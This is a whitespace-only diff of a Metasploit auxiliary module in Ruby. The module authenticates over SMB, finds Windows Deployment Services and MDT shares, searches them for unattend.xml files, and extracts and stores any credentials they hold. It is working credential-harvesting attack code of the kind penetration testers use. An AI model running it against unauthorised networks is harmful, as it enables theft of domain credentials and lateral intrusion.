@@ -15,16 +15,16 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Exploit::Remote::DCERPC
-	
+
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
 			'Description'    => %q{
 						Used after discovering domain credentials with aux/scanner/dcerpc/windows_deployment_services
-						or if you already have domain credentials. Will attempt to connect to the RemInst share and any 
+						or if you already have domain credentials. Will attempt to connect to the RemInst share and any
 						Microsoft Deployment Toolkit shares (identified by comments), search for unattend files, and recover credentials.
 			},
 			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
@@ -42,10 +42,10 @@ class Metasploit3 < Msf::Auxiliary
 				Opt::RPORT(445),
 				OptString.new('SMBDomain', [ false, "SMB Domain", '']),
 			], self.class)
-		
+
 		deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
 	end
-	
+
 
 	def share_type(val)
 			stypes = [
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			stypes[val]
 	end
-	
+
 	# Stolen from enumshares - Tried refactoring into simple client, but the two methods need to go in EXPLOIT::SMB and EXPLOIT::DCERPC
 	# and then the lanman method calls the RPC method. Suggestions where to refactor to welcomed!
 	def srvsvc_netshareenum
@@ -123,10 +123,10 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-	
+
 			@shares = []
 			deploy_shares = []
-			
+
 			begin
 				connect
 				smb_login
@@ -137,12 +137,12 @@ class Metasploit3 < Msf::Auxiliary
 					# look at iconv for 1.8/1.9 compatability?
 					if (share[0].unpack('H*') == "REMINST\x00".encode('utf-16LE').unpack('H*')) ||
 						(share[2].unpack('H*') == "MDT Deployment Share\x00".encode('utf-16LE').unpack('H*'))
-						
+
 						print_status("#{ip}:#{rport} #{share[0]} - #{share[1]} - #{share[2]}")
 						deploy_shares << share[0]
 					end
 				end
-				
+
 				deploy_shares.each do |deploy_share|
 					query_share(ip, deploy_share)
 				end
@@ -156,16 +156,16 @@ class Metasploit3 < Msf::Auxiliary
 		share_path = "\\\\#{rhost}\\#{deploy_share}"
 		print_status("Enumerating #{share_path}")
 		table = Rex::Ui::Text::Table.new({
-                        'Header' => share_path,
-                        'Indent' => 1,
-                        'Columns' => ['Path', 'Type', 'Domain',  'Username', 'Password']
-        })
-		
+			'Header' => share_path,
+			'Indent' => 1,
+			'Columns' => ['Path', 'Type', 'Domain',  'Username', 'Password']
+		})
+
 		creds_found = false
-		
+
 		# ruby 1.8 compat?
 		share = deploy_share.force_encoding('utf-16LE').encode('ASCII-8BIT').strip
-	
+
 		begin
 			simple.connect(share)
 		rescue ::Exception => e
@@ -174,10 +174,10 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		results = simple.client.file_search("\\", /unattend.xml$/i, 10)
-		
+
 		results.each do |file_path|
 			file = simple.open(file_path, 'o').read()
-			
+
 			unless file.nil?
 				loot_unattend(file)
 
@@ -196,16 +196,16 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 		end
-		
+
 		if creds_found
 			print_line
-			table.print 
+			table.print
 			print_line
 		else
 			print_error("No Unattend files found.")
 		end
 	end
-	
+
 	def parse_client_unattend(data)
 		begin
 			xml = REXML::Document.new(data)
@@ -214,16 +214,16 @@ class Metasploit3 < Msf::Auxiliary
 					print_error("Invalid XML format")
 					vprint_line(e.message)
 			end
-    
+
 		return Rex::Parser::Unattend.parse(xml).flatten
 	end
-	
+
 	def loot_unattend(data)
-			return if data.empty?	
+			return if data.empty?
 			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
 			print_status("Raw version saved as: #{p}")
 	end
-	
+
 	def report_creds(domain, user, pass)
 		report_auth_info(
 				:host  => rhost,
